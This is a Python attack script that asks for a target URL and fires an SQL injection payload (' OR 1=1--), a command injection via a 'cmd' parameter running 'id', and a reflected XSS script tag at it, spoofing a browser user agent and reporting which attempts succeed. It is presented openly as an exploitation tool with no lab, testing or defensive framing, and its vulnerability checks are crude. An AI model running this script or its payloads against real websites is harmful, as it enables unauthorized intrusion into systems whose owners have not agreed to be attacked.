import requests
import time
import random
import string
from urllib.parse import urlparse

# Global headers for user agent spoofing
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
}

# SQL Injection Exploit
def exploit_sql_injection(url, payload):
    print(f"[+] Attempting SQL Injection on {url}")
    vulnerable = False

    # Inject the payload into URL
    response = requests.get(url + payload, headers=headers)

    if "sql" in response.text.lower() or "error" in response.text.lower():
        vulnerable = True
        print(f"[+] SQL Injection Success with payload: {payload}")
    else:
        print(f"[-] SQL Injection failed on {url}")
    
    return vulnerable

# Command Injection Exploit
def exploit_command_injection(url, command):
    print(f"[+] Attempting Command Injection on {url}")
    vulnerable = False
    
    # Payload for command injection
    payload = f"?cmd={command}"

    # Inject command into URL
    response = requests.get(url + payload, headers=headers)

    if "uid=" in response.text:
        vulnerable = True
        print(f"[+] Command Injection Successful with command: {command}")
    else:
        print(f"[-] Command Injection failed on {url}")

    return vulnerable

# Cross-Site Scripting (XSS) Exploit
def exploit_xss(url, payload):
    print(f"[+] Attempting XSS on {url}")
    vulnerable = False

    # XSS payload execution
    response = requests.get(url + payload, headers=headers)

    if payload in response.text:
        vulnerable = True
        print(f"[+] XSS Successful with payload: {payload}")
    else:
        print(f"[-] XSS failed on {url}")
    
    return vulnerable

# Random String Generator (used for POC)
def random_string(length=8):
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

# Main Exploit Function
def run_exploit(target_url):
    parsed_url = urlparse(target_url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"

    print(f"\n[+] Starting Exploitation on {base_url}...\n")

    # Exploit 1: SQL Injection
    sql_payload = "' OR 1=1--"
    exploit_sql_injection(target_url, sql_payload)

    # Exploit 2: Command Injection
    command = "id"
    exploit_command_injection(target_url, command)

    # Exploit 3: XSS
    xss_payload = f"<script>alert('{random_string()}')</script>"
    exploit_xss(target_url, xss_payload)

    print(f"\n[+] Exploitation attempts on {base_url} completed.\n")

if __name__ == "__main__":
    # Example target
    target_url = input("[*] Enter the target URL: ")
    run_exploit(target_url)
